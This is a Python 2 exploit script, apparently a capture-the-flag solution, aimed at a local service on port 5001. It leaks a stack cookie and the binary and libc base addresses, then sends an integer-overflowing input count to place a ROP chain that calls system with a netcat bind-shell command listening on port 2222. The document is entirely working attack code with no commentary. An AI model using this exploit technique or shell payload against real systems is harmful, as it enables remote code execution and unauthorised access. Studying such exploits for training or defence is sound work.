import socket
import sys
import struct

def exploit(payload):
	HOST = '127.0.0.1'
	PORT = 5001
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))

	s.send(payload)
	s.shutdown(socket.SHUT_WR)

	lines = ''
	tmp = s.recv(1024)
	lines += tmp
	while tmp:
		tmp = s.recv(1024)
		lines += tmp
	return lines.splitlines()

def leak_val(n):
	leak1 = set(exploit('2\n32\n'+'0\n'*(n+1))[5:])
	leak2 = set(exploit('2\n32\n'+'0\n'*(n))[5:])
	for leak in leak2:
		if leak not in leak1:
			return int(leak, 10)
	print leak1, leak2
	raise Exception("FAIL")

cookie = leak_val(31)
ptr_longs = leak_val(9)+8
base_address_chall = leak_val(25)-3602
base_address_libc = leak_val(12)-218288

print 'cookie -> 0x%X'%cookie
print 'ptr_longs -> 0x%X'%ptr_longs
print 'base_address_chall -> 0x%X'%base_address_chall
print 'base_address_libc -> 0x%X'%base_address_libc

gadget_pop_rdi_retn = 0x1633 + base_address_chall
address_payload = 25*8 + ptr_longs
address_system = 283536 + base_address_libc
address_exit = 237616 + base_address_libc

raw_input()
print "GO"

HOST = '127.0.0.1'
PORT = 5001
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

values = {
	10: 10,
	9: ptr_longs,
	8: 100,
	5: 4 << 32,
	19: cookie,
	21: gadget_pop_rdi_retn,
	22: address_payload,
	23: address_system,
	24: address_exit
}

payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp 2222 >/tmp/f'
payload = payload + "\x00" * (8 - len(payload)%8)
for i in xrange(0, len(payload), 8):
	values[25+i/8] = struct.unpack('<Q', payload[i:i+8])[0]

s.send("1\n") # operation
s.send("%d\n"%((2**64 + 0x10) / 8)) # nb_inputs
for i in xrange(1000):
	s.send("%d\n"%values.get(i, 0))

tmp = s.recv(1024)
while tmp:
	sys.stdout.write(tmp)
	tmp = s.recv(1024)